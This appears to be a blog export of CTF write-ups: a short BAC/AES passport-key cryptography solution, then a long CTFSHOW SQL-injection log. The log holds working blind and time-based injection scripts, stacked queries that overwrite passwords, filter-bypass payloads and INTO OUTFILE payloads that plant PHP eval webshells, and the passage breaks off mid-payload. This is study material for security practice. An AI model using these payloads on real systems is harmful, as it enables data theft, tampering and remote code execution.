Europe\n这里呈现给你了一个通过AES加密的信息（加密模式为CBC，其中iv值为全0，通过01-00填充）。另外，你还收到了对应的密钥，可惜并不完整。这种传递形式一般出现在身份文件中机器可识别区域，例如欧洲护照\nIt is the objective to find the plaintext of the following base64-encoded message.9MgYwmuPrjiecPMx61O6zluy3MtlXQQ0E59T3xB6u0GyflgYs2i3K9Jx aa0zj4gTMazJuApwd6+jdyel5iGHvhQyDHGVIAuYTgJrbFDrfB22Fpil2N fNnWFBTXyRSDI\n我们的目标就是去解密下列经过base64编码的信息\nFor encryption a key Kenc based on the Basic Access Control (BAC) protocol has been generated and applied. For decryption the following characters have been transmitted from which Kenc can be derived (The kind of coding of these characters is described in [1])： 12345678&lt;8&lt;&lt;&lt;1110182&lt;1111167&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;4\n在加密时所使用的密钥，我们基于基础访问协议来生成和使用。在解密时可以从下列传输的字符串中获得密钥（这种字符的编码描述在[1]）\nUnfortunately, during transmission a character was lost and has been highlighted with a &quot;?&quot;. Nevertheless, you can make it visible again with the help of [2]. To be able to compute the key Kenc afterwards you can find an overview of the applied encoding protocols in [3], [4] and an example in [5].\n不幸的是，在传输字符串时有一个字符丢失了并被以?高亮标记。然而，通过[2]的帮助，可以恢复。之后，通过浏览对应的编码协议[3]、[4]，便可以计算出密钥。在[5]中给出了一个例子\n\nSolution\n翻译完感觉有些模糊，因为里面有很多引用。但是总体思路已经给出：首先恢复字符串中丢失的字符，接着计算出密钥，然后最后解密即可。\n\n恢复字符参考文章2\n\n\n\n这里就直接定位到了我们要求的?是到期日的校验位，并且&lt;代表0\n\n  s = &quot;111116&quot;q = [3,7,1]result = 0for i in range(len(s)):    result += int(s[i])*q[i%3]print(result % 10)\n  得到答案为7\n计算密钥key先给出参考引用\n\n这里首先通过证件号码、出生日期和到期日及其各自的校验位生成密钥种子\n\n\n证件号码 12345678&lt;8\n出生日期1110182\n到期日 1111167\n\n\n将其进行SHA-1哈希并取高16字节即可得到密钥种子\n# coding=gbkfrom hashlib import sha1def hash(content):    h = sha1(content).hexdigest()    return h[:32]content = b&#x27;12345678&lt;811101821111167&#x27;print(hash(content))# a095f0fdfe51e6ab3bf5c777302c473e\n继续看参考引用\n\n还挺麻烦，也就是这里还要基于密钥种子生成两个DES密钥。有个计数器c需要利用，因为我们是要生成加密密钥，所以用第一个0x 00 00 00 01\n这里在最后还要计算一个奇偶校验位，也就是每八位都要加上一个校验位，最终形成密钥\n# coding=gbkfrom hashlib import sha1from Crypto.Cipher import AESfrom base64 import b64decodedef hash(content):    return sha1(content).hexdigest()def correct(key):    result = []    a = bin(int(key, 16))[2:]    for i in range(0, len(a), 8):        if a[i:i+7].count(&quot;1&quot;) % 2 == 0:            result.append(a[i:i+7])            result.append(&quot;1&quot;)        else:            result.append(a[i:i+7])            result.append(&quot;0&quot;)    return hex(int(&quot;&quot;.join(result), 2))[2:]cipher = b&quot;9MgYwmuPrjiecPMx61O6zIuy3MtIXQQ0E59T3xB6u0Gyf1gYs2i3K9Jxaa0zj4gTMazJuApwd6+jdyeI5iGHvhQyDHGVlAuYTgJrbFDrfB22Fpil2NfNnWFBTXyf7SDI&quot;c = &#x27;00&#x27;*3 + &#x27;01&#x27;seed = &#x27;a095f0fdfe51e6ab3bf5c777302c473e&#x27;D = seed + c# 这里要重新转换为字节数组，因为这里只是16进制表示strH = hash(bytes.fromhex(D))[:32]ka, kb = H[:16], H[16:]key = bytes.fromhex(correct(ka)) + bytes.fromhex(correct(kb))print(key)# b&#x27;\\xea\\x86E\\xd9\\x7f\\xf7%\\xa8\\x98\\x94*\\xa2\\x80\\xc41y&#x27;\n\n\n解密\n这里就没啥可说的了，AES-CBC解密即可。除了要注意iv的值为ascii码的0值，而不是数字0\nmode = AES.new(key, AES.MODE_CBC, iv=b&quot;\\x00&quot;*16)plain = mode.decrypt(b64decode(cipher))print(plain)\n\n\n运行结果\n总结\n题目整体不是很难，只要跟着说明一步步走即可。中间遇到了一些代码上的问题，比如说字节与16字符串之间的转换。也算是更加熟练了对python 密码相关库的使用\n写了这么多道题，也学到了很多基于分组密码加密模式的小trick\n\n","tags":["cryptography"]},{"title":"CTFSHOW-SQL注入","url":"/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"CTF-SHOW SQL 做题记录\n盲注\n$sql = &quot;select pass from ctfshow_user where username = &#x27;&#123;$username&#125;&#x27;&quot;;\n回显点：密码错误与用户名不存在\n过滤\npreg_match(&#x27;/file|into|ascii/i&#x27;, $username)\n绕过 ascii&lt;=&gt;ord\nexp\n# coding=gbkimport requestsurl = &quot;http://cf76bf80-228d-441d-a697-07766df6cae6.challenge.ctf.show/api/&quot;# 二分法查找result = &quot;&quot;i = 0while True:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查版本        #payload = &quot;select version()&quot;        # 查表 ctfshow_fl0g,ctfshow_user       # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;        # 查列 id,f1ag        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_fl0g&#x27;&quot;        # 查值        payload = &quot;select group_concat(id, f1ag) from ctfshow_fl0g&quot;        data = &#123;            &#x27;username&#x27;:f&quot;admin&#x27; and if(ord(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#x27;1&quot;,            &#x27;password&#x27;:&#x27;1&#x27;        &#125;        r = requests.post(url, data=data)        if(r.json()[&#x27;msg&#x27;]==&#x27;密码错误&#x27;):            head = mid + 1        else:            tail = mid        if head != 32:        # 检验最终位        result += chr(head)    else:        break    print(result)\n\n盲注\nord改用正则\n\n\n# coding=gbkimport requestsimport stringimport timeurl = &quot;http://50fdc8ac-7670-400c-a757-1b73cecc96b2.challenge.ctf.show/api/&quot;db = string.ascii_lowercase + string.digits + &quot;&#123;_-&#125;&quot;flag = &#x27;&#x27;for i in range(1, 50):    for j in db:        payload = &quot;select group_concat(id, f1ag) from ctfshow_fl0g&quot;        data = &#123;            &#x27;username&#x27;:f&quot;admin&#x27; and if(substr((&#123;payload&#125;),&#123;i&#125;,1)regexp&#x27;&#123;j&#125;&#x27;,1,2)=&#x27;1&quot;,            &#x27;password&#x27;:&#x27;1&#x27;        &#125;        r = requests.post(url, data=data)        if(r.json()[&#x27;msg&#x27;]==&#x27;密码错误&#x27;):            flag += j            print(flag)            if &quot;&#125;&quot; == j:                exit(0)            break          time.sleep(0.1)      \n\n盲注\nsubstr改用mid\n# coding=gbkimport requestsimport stringimport timeurl = &quot;http://3eea53d5-0746-4794-84c3-da7f7c73b5a1.challenge.ctf.show/api/&quot;db = string.ascii_lowercase + string.digits + &quot;&#123;_-&#125;,&quot;flag = &#x27;&#x27;for i in range(1, 50):    for j in db:        #        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_flxg&#x27;&quot;        # 查列 id,f1ag ctfshow_flxg ctfshow_user        payload = &quot;select group_concat(id, f1ag) from ctfshow_flxg&quot;        data = &#123;            &#x27;username&#x27;:f&quot;admin&#x27; and if(mid((&#123;payload&#125;),&#123;i&#125;,1)regexp&#x27;&#123;j&#125;&#x27;,1,2)=&#x27;1&quot;,            &#x27;password&#x27;:&#x27;1&#x27;        &#125;        r = requests.post(url, data=data)        if(r.json()[&#x27;msg&#x27;]==&#x27;密码错误&#x27;):            flag += j            print(flag)            if &quot;&#125;&quot; == j:                exit(0)            break          time.sleep(0.1)      \t\n\n盲注\n不影响mid 没被过滤 \n还有人用LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE一类\n\n堆叠注入\n直接根据之前查到的表暴力改密码\n0;update`ctfshow_user`set`pass`=1;\n\n堆叠注入\n限制了用户名长度 过滤的地方好像写错了\n但是由于最后回显了1应该是绕过登陆了，比较玄\n1;select+1;\n\n堆叠注入\n这里用到了堆叠的另一个应用，换列大法\n使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名\n这题利用的是password为纯数字的特性，然后id也是纯数字。只需要将id列换成pass然后去匹配username那一列的id即可 (只不过不知道它这个username是咋知道的有0\n# coding=gbkimport requestsurl = &quot;http://3c983893-89b6-4b85-a956-a2af007fee5a.challenge.ctf.show/api/&quot;for i in range(100):    if i == 0:        data = &#123;            &quot;username&quot;: &quot;1;alter table `ctfshow_user` change column `pass` `whatever` varchar(255);alter table `ctfshow_user` change column `id` `pass` varchar(255);&quot;,            &quot;password&quot;: f&quot;&#123;i&#125;&quot;        &#125;        r = requests.post(url, data=data)    data = &#123;        &quot;username&quot;: &#x27;0&#x27;,        &quot;password&quot;: f&quot;&#123;i&#125;&quot;    &#125;    r = requests.post(url, data=data)    if &quot;登陆成功&quot; in r.json()[&#x27;msg&#x27;]:        print(r.json()[&#x27;msg&#x27;])        break\n\n堆叠注入 继续打 alter没被过滤\n\n堆叠注入 把(给过滤了 这里的用法跟196一样 思路就是改回显数据为我们已知的，只不过这道题的select被ban了，但我们知道表名\n1;show tables;\n\n堆叠注入 多了个过滤,原理一样\n\nsqlmap 直接探测好想不大行 加 —refer 常规查即可\n\nsqlmap data传参\n\nsqlmap 该用put提交？ 另外请求url变化了不太明白。由于PUT提交这里还需要注意的是需要改变请求头中的数据类型，免得被识别成表单数据\nsqlmap -u &quot;u/api/index.php&quot; --method=&quot;PUT&quot; --refers=&quot;ctf.show&quot; --headers=&quot;Content-Type: text/plain;&quot; --data=&quot;id=1&quot; \n\nsqlmap 在之前的基础上加上cookie的数据\n\nsqlmap 需要鉴权 可以看到在访问api之前还需要去请求一个getToken页面，所以利用sqlmap设置好注入测试期间需要访问的页面及次数\n\n\n时间盲注\n主要是找注入点比较难搞，不知道他们咋找到的参数\n\n\n\nPOC and 好像被过滤了\nip=-1 or if(1=1,sleep(3),1)%23\n这里还学到了写脚本当中request方法中的timeout参数，超时则会抛出异常\n\n# coding=gbkimport requestsurl = &quot;http://a6530d33-5713-4b2d-aff5-b818b24742ea.challenge.ctf.show/api/&quot;result = &quot;&quot;i = 0while True:    i += 1    head = 32    tail = 127    while head &lt; tail:        #payload = &quot;select version()&quot;          #payload = &quot;select database()&quot;         #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;         #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_flagx&#x27;&quot;           payload = &quot;select group_concat(flaga) from ctfshow_flagx&quot;         mid = (head + tail) &gt;&gt; 1        data = &#123;            &#x27;ip&#x27;: f&quot;if((ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;),sleep(1),1)&quot;,            &#x27;debug&#x27;:&#x27;1&#x27;        &#125;        try:            r = requests.post(url, data=data, timeout=1)            tail = mid        except Exception as e:            head = mid + 1    if head != 32:        result += chr(head)    else:        break    print(result)\n\n时间盲注\n加了单引号闭合\nPOC\nip=123&#x27; or if(1=(select 1),sleep(3),1)#&amp;debug=1\n继续打\n\n时间盲注，解base64。搞不明白它们这个参数是咋设置的。。。\n想明白了语句应该是这样\nselect id from ctfshow_info where id=from_base64($ip);\n\n\n刚开始想的直接把整个注入语句进行编码就行。但是不太行，应该是它这个参数换了的原因…。所以就沿用闭合语句的方式\nip=&#x27;&#x27;) or if(1=(select 1),sleep(3),1)#\n# coding=gbkimport requestsfrom base64 import b64encodeurl = &quot;http://e299192d-1775-4b13-90a7-41900827d68e.challenge.ctf.show/api/&quot;result = &quot;&quot;i = 0while True:    i += 1    head = 32    tail = 127    while head &lt; tail:        #payload = &quot;select version()&quot;          #payload = &quot;select database()&quot;         payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;         #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_flagxc&#x27;&quot;           #payload = &quot;select group_concat(flagaa) from ctfshow_flagxc&quot;         mid = (head + tail) &gt;&gt; 1        data = &#123;            &#x27;ip&#x27;: f&quot;&#x27;&#x27;) or if((ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;),sleep(1),1)#&quot;,            &#x27;debug&#x27;:&#x27;1&#x27;        &#125;        try:            r = requests.post(url, data=data, timeout=1)            tail = mid        except Exception as e:            head = mid + 1    if head != 32:        result += chr(head)    else:        break    print(result)\n\n时间盲注\n语句闭合采用括号的形式，sleep函数终于也被ban了。试试新的benchmark\n执行表达式exp，count次（消耗CPU）\n\nPOC\nip=1) or if(1=2, benchmark(1000000, md5(1)), 1)\n\n时间盲注\n这次把benchmark也给屏蔽了\n这里便引出第三种时间盲注的方法：笛卡尔积\n我们将mysql内置库表进行笛卡尔积查询，其查询开销将变得巨大\nselect count(*) from information_schema.columns A,information_schema.columns B;\n\n\n &lt;img src=&quot;/image-20220828125029627.png&quot; alt=&quot;image-20220828125029627&quot; style=&quot;zoom:50%;&quot; /&gt;\n\n POC\n\n ip=1) or if(1=2, (select count(*) from information_schema.columns A,information_schema.columns B), 1)#\n不过容易直接把服务器搞崩，估摸着是并两个表就已经很长时间了导致的，最多能延个5s左右\n利用RLIKE REGEXP正则匹配\nselect rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;); ​ 正则语法： . : 匹配任意单个字符 * ： 匹配0个或多个前一个得到的字符 [] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。 ^ : 匹配开头，如^s匹配以s或者S开头的字符串。 $ : 匹配结尾，如s$匹配以s结尾的字符串。 &#123;n&#125; : 匹配前一个字符反复n次。 RPAD(str,len,padstr) 用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len&#x27;，那么它将被截除到 len个字符。 mysql&gt; SELECT RPAD(&#x27;hi&#x27;,5,&#x27;?&#x27;); -&gt; &#x27;hi???&#x27; ​ repeat(str,times)  复制字符串times次\nselect concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+b&#x27;\n这个可以延时5s，等价于sleep(5)\nPOC\nip=1) or if(1=2, (select rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+&#x27;), 1)#\n\n时间盲注\n这波把上一轮的rlike给用了，只能再试一试笛卡尔积\nPOC\nip=1) or if(1=2, (select count(*) from information_schema.columns A,information_schema.columns B), 1)#\n时间参数真的难调，最后合并一下才能提交\n\n\n时间盲注 这次过滤了前面用到的一大截包括字符串截取函数\n\n\n\n依照上一个笛卡尔积的脚本，我们作相关函数的替换\nascii替换为字符串匹配，substr替换为left，group_concat的话用limit慢慢出\n太不容易了淦\n\n# coding=gbkimport requestsimport timeimport stringurl = &quot;http://63e8e9cb-226f-4b44-8f90-c4ef31182595.challenge.ctf.show/api/&quot;db = &#x27;0123456789abcdef-&#123;&#125;,_&#x27;result = &quot;ctfshow&#123;fcba847d-bf3b-4f6a-942b&quot; # 4f6a-942b-0while True:    for s in db:        #payload = &quot;select version()&quot; ctfshow_flagxca,ctfshow_info        #payload = &quot;select column_name from information_schema.columns where table_name = &#x27;ctfshow_flagxcac&#x27; limit 1,1&quot;        #payload = &quot;select table_name from information_schema.tables where table_schema = database() limit 0, 1&quot;        payload = &quot;select flagaabcc from ctfshow_flagxcac limit 0, 1&quot;        data = &#123;            &#x27;ip&#x27;:f&quot;1) or if((&#123;payload&#125;) like &#x27;&#123;result+s&#125;%&#x27;, (select count(*) from information_schema.columns A,information_schema.columns B), 1&quot;,            &quot;debug&quot;:&#x27;1&#x27;        &#125;        result += s        try:            r = requests.post(url, data=data, timeout=0.3)             result = result[:-1]        except Exception as e:            print(result)            break        time.sleep(0.2)    if result[-1] == &#x27;&#125;&#x27;:        break\n\nlimit注入\n参考学习P神https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html\n版本适用于mysql 5.x\n可以利用procedure analyse(xxx,1)配合报错注入或者时间盲注（报错里面套benchmark）\nctfshow_web_flag_x\npayload\npage=1&amp;limit=1 procedure analyse(extractvalue(0x7e, concat((select version()), 0x7e)),1)\n这里分清一个概念就是：对于limit注入如果存在group by字段的话是不可以跟union的;如果不存在的话也可以直接union注入，不过这关好像是过滤掉了select\n\ngroup by注入\n应该是和order by注入差不多，可以直接利用盲注，username和id字段的回显就不一样。\n至于如何寻找的字段\n\nexp\n# coding=gbkfrom unittest import resultimport requests# 1199 252url = &quot;http://24b1d804-1f69-4732-89d1-6a70e05693ad.challenge.ctf.show/api/index.php&quot;result = &quot;&quot;i = 0while True:    i += 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # payload = &quot;select database()&quot; ctfshow_web ctfshow_flaga        payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;&quot;        payload = &quot;select flagaabc from ctfshow_flaga&quot;        params = &#123;&quot;u&quot;: f&quot;if(ord(substr((&#123;payload&#125;), &#123;i&#125;, 1))&gt;&#123;mid&#125;, id, username)&quot;&#125;        r = requests.get(url, params=params)        if(len(r.text)==1199):            head = mid + 1        else:            tail = mid        if head != 32:        result += chr(head)    else:        break    print(result)\n\ngroup by注入\n与上一关不同的是，这一关的把数字给过滤掉了。回忆一下，1其实和true是等同的并且后者同样满足加减运算规则\n\n所以只需将上一关涉及到数字的替换即可\ndef replaceNum(num):    return &#x27;+&#x27;.join([&#x27;true&#x27;]*num)\n\n综合题\n存在robots.txt，里面写了pwdreset.php，访问发现是一个密码重置界面。登陆进去以后是文件上传。因为文件上传的骚姿势还没学，直接上传群里的payload.bin，会在同目录下生成1.php木马，命令执行即可。分析一下bin文件，可以看到里面也有sql的写文件操作。应该是文件上传配合sql写文件（这里利用了堆叠注入）\n&lt;?=$_GET[1]\\\\`?&gt;`\n&quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;;--+\n\n\n堆叠注入\n\n过滤\n\n\n\n前面的表名和列名可以用show来替换select\n# 表&#x27;; show tables; # ctfshow_flagasa# 列&#x27;;desc ctfshow_flagasa; # flagas或者&#x27;;show columns from ctfshow_flagasa;\n最后的select利用的是handler：(另一种方法是预处理语句)\nHANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE\n\npayload\n?username=&#x27;;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;\n\n堆叠注入\n这一关多过滤了show和左括号\n所以这一关用到了预处理语句\n参考\nhttps://www.cnblogs.com/geaozhang/p/9891338.html\n# 定义预处理语句PREPARE stmt_name FROM preparable_stmt;# 执行预处理语句EXECUTE stmt_name [USING @var_name [, @var_name] ...];# 删除(释放)定义&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;\n\n对于上一关使用预处理语句的话，因为preparable_stmt是一个字符串，所以可以通过拼接的方式来绕过敏感函数\n比如\nconcat(&#x27;sele&#x27;,&#x27;ct&#x27;)\n这一关则是利用16进制编码绕过\n&#x27;;prepare a from 0x73686f77207461626c6573;execute a;    #ctfsh_ow_flagas&#x27;;prepare a from 0x646573632063746673685f6f775f666c61676173;execute a;    # flagasb&#x27;;prepare a from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;execute a;\n\n堆叠注入\n首先看过滤，比之前多了一个逗号，之前的payload还可以用。而且这次sql语句中直接给出了表名和字段名\n\n查找原来的字段发现已经不在里头了\n\n\n\n这道题考查的是sql的存储过程\n存储程序（Stored Procedure）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。存储过程是为了完成特定功能的SQL语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数(需要时)来调用执行。存储过程思想上很简单，就是数据库 SQL 语言层面的代码封装与重用。调用： call function()\n也就是可以预定义一些函数来方便调用。而这些函数存在与information_schema.routines表中，按常规直接去查\n已经发现\n\n也可以\n&#x27;;call getFlag();\n228 - 230. 堆叠注入\n这关黑名单存入了数据库里，然后仍然可以编码绕过\n\nupdate注入\n利用了一个update重复给字段赋值的特性，最后呈现出来的结果随后面的字段，所以根据这个特性我们就可以将敏感数据回显到可见字段上\n\n注意闭合引号\npayload\npassword=1&#x27;, username=database()%23&amp;username=1password=1&#x27;, username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;username=1password=1&#x27;, username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flaga&#x27;)%23&amp;username=1password=1&#x27;, username=(select group_concat(flagas) from flaga)%23&amp;username=1\n\nupdate注入\n\n\n\n前面多了个md5和括号，闭合即可&#39;)\n\nupdate注入\n\n和之前一样也没有过滤，sql语句也一样，但是没有回显变化。尝试盲注\n发现在http://230a1b50-8335-4eb0-9629-4a988a675b30.challenge.ctf.show/api/页面存在时间延迟，直接打\n还想复杂了，直接跟select一样，不过需要注意的一点是，update查询是一行一行查询，每行都会触发一个sleep函数，所以要选小一点\n时间参数真的不好调…..\nPOC\nusername=1&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;, sleep(0.05), 1)#&amp;password=1\nexp\n# coding=gbkimport requestsimport timeurl = &#x27;http://0346fc96-8f6a-4f38-87d6-7a77545eb2a7.challenge.ctf.show/api/?page=1&amp;limit=10&#x27;result = &quot;&quot;i = 0while True:    i += 1    head = 32    tail = 127    while head &lt; tail:        # ctfstow&#123;34fcde14-25fa-467c-8f50-73f171dbd3b5&#125;        mid = (head + tail) &gt;&gt; 1        payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;&quot;        payload = &quot;select group_concat(flagass233) from flag233333&quot;        payload = &quot;select database()&quot;        data = &#123;            &#x27;password&#x27;: f&quot;1&#x27;, pass=if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;, sleep(0.05), 1)#&quot;,            &#x27;username&#x27;: &#x27;1&#x27;        &#125;        try:            r = requests.post(url, data=data, timeout=0.9)            tail = mid        except Exception as e:            head = mid + 1    if head != 32:        result += chr(head)    else:        break    print(result)\n\nupdate注入\n这道题过滤了引号\n\n\n\nupdate ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;\n由于无法再用引号去闭合语句，利用反斜杠的方法进行逃逸。然后pass就等于&#39; where username =，后面依然可用重复字段的注入方式\nupdate ctfshow_user set pass = &#x27;\\&#x27; where username = &#x27;, pass=(select database());update ctfshow_user set pass = &#x27;\\&#x27; where username = &#x27;, pass=(select group_concat(table_name) from information_schema.tables where table_schema=database());   # flag23aupdate ctfshow_user set pass = &#x27;\\&#x27; where username = &#x27;, pass=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361);  # flagass23s3update ctfshow_user set pass = &#x27;\\&#x27; where username = &#x27;, pass=(select flagass23s3 from flag23a);\n\nupdate注入\n过滤了or和单引号。之前的payload中因为存在information_schema关键词，里面包含了or，所以不能继续用\n考虑使用innodb存储引擎来绕过\nInnoDB新增加了两张表innodb_index_stats与innodb_table_stats，这两张表记录了所有新建的数据库与表\n\n\n这两个表都可以来查库和表名，遗憾的是并没有字段名可以查到。需要注意的是innodb这两张表位于mysql库当中\nupdate ctfshow_user set pass = &#x27;\\&#x27; where username = &#x27;, pass=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database());# innodb_index_stats表不知道为啥没法用where #flag23a1哦也可以这么写-- 查询所有新增数据库select group_concat(distinct database_name) from mysql.innodb_index_stats;-- 查询当前数据库中的所有表名select group_concat(distinct table_name) from mysql.innodb_index_stats where database_name=schema();\n对于字段无法这么弄，采用无列名注入\nhttps://zhuanlan.zhihu.com/p/98206699\n-- 先猜出字段数select 1,2,3 union select * from admin;-- 我们的列名被替换为了对应的数字，也就是可以去用数字来查我们想知道的列值select `3` from (select 1,2,3 union select * from admin)a;-- 或者在引号被过滤的情况下采用别名的方式select b from (select 1,2,3 as b union select * from admin)a;-- 多列同时查select concat(`2`,0x7e,`3`) from (select 1,2,3 union select * from admin)a;\npayload\npassword=\\&amp;username=, pass=(select group_concat(`2`) from(select 1,2,3 union select * from flag23a1)a)%23\n\nupdate注入\n这里把flag关键字也给过滤了，但不知道为啥可以直接打\n\ninsert注入\n\n\n\n\n思路和select中的post注入一致，也就是闭合前面参数，注释后面的参数\npayload\nusername=whatever&#x27;, database());%23&amp;password=whateverusername=whatever&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database()));%23&amp;password=whatever   #flagusername=whatever&#x27;, (select group_concat(column_name) from information_schema.columns where table_name=0x666c6167));%23&amp;password=whatever   # flagass23s3username=whatever&#x27;, (select flagass23s3 from flag));%23&amp;password=whatever\n\ninsert注入\n过滤了空格，直接用+替换发现不太行，可能是hackbar二次编码的缘故，该用括号子查询的方式绕过空格\n使用括号，括号是用来包围子查询的；因此任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格\nusername=whatever&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));%23&amp;password=whatever   # flagbusername=whatever&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c616762)));%23&amp;password=whatever  #flagusername=whatever&#x27;,(select(flag)from(flagb)));%23&amp;password=whatever\n\ninsert注入\n又把or过滤了，先用innodb引擎代替差表\nusername=whatever&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())));%23&amp;password=whatever   # flagbb\n本来之后是想试试无列名注入，发现好像不行。发现解是盲猜的字段名flag…\nusername=whatever&#x27;,(select(flag)from(flagbb)));%23&amp;password=whatever\n\ninsert注入\n过滤空格 or sys mysql\n\n\nHint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写\n也就是说前面表我们是查不了了，只能自己爆破出来\nusername=whatever&#x27;,(select(flag)from(flag&#123;爆破点&#125;)));%23&amp;password=whatever\n哦哦其实就是自己把所有的可能全部试一遍，然后正确的肯定在里头，也就会把flag显示出来\nexp\n# coding=gbkimport requestsurl = &quot;http://ebc292e9-b356-434a-b046-ec9c85cfb099.challenge.ctf.show/api/insert.php&quot;# username=whatever&#x27;,(select(flag)from(flag&#123;爆破点&#125;)));%23&amp;password=whateverfor a in &quot;ab&quot;:    for b in &quot;ab&quot;:        for c in &quot;ab&quot;:            for d in &quot;ab&quot;:                for e in &quot;ab&quot;:                    test = &quot;flag&quot; + a + b + c + d + e                    data = &#123;                        &quot;username&quot;: f&quot;whatever&#x27;,(select(flag)from(&#123;test&#125;)));#&quot;,                        &quot;password&quot;: &quot;whatever&quot;                    &#125;                    r = requests.post(url, data=data)\n\ndelete注入\n参数点为post传参，名字为id\n\n\n\nsql语句，没有过滤\n\n没有回显点，考虑时间盲注，注意的是时间开销上是所有记录之和\ndelete from ctfshow_user where id = if(1=1, sleep(0.03), 1)\n\nfile注入\n题面给出了一个写文件操作，filename可控\n\nPOST传参，参数为filename\n\n\n\n这里利用到了into outfile后面的一些其他输出参数\nSELECT ... INTO OUTFILE &#x27;file_name&#x27;        [CHARACTER SET charset_name]        [export_options]export_options:    [&#123;FIELDS | COLUMNS&#125;        [TERMINATED BY &#x27;string&#x27;]//分隔符        [[OPTIONALLY] ENCLOSED BY &#x27;char&#x27;]        [ESCAPED BY &#x27;char&#x27;]    ]    [LINES        [STARTING BY &#x27;string&#x27;]        [TERMINATED BY &#x27;string&#x27;]    ]----------------------------------------------------“OPTION”参数为可选参数选项，其可能的取值有：`FIELDS TERMINATED BY &#x27;字符串&#x27;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\\t”。`FIELDS ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。`FIELDS OPTIONALLY ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。`FIELDS ESCAPED BY &#x27;字符&#x27;`：设置转义字符，只能为单个字符。默认值为“\\”。`LINES STARTING BY &#x27;字符串&#x27;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。`LINES TERMINATED BY &#x27;字符串&#x27;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\\n”。\n最后两个参数的作用可以让我们在写入文件中挂马\npayload： 注意双引号好像被转义了，之后蚁剑去连接就行\nfilename=1.php&#x27; LINES STARTING BY &#x27;&lt;?php @eval($_POST[1]); 